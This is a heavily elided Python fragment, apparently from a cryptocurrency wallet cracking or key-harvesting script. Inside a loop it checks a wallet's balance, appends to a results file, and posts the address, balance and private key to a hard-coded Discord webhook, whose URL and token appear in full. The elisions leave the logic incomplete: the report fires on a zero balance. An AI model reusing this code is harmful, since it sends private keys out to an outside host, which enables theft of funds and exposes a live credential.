        ...
        while 1:
            ...
            if balance == 0:
                ...
                with open("results/wet.txt", "a") as w:
                    ...
                    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/915014466196877342/Wq23EQp5MTkdcgqA1CLUGT-5VqcJD__-IDXmtm6UCIj7syaRpKfgJwoKBRiLXEsmkjyi', rate_limit_retry=True, content=f'@everyone Address: {addr} | Balance: {balance} | Private key: {prv}')
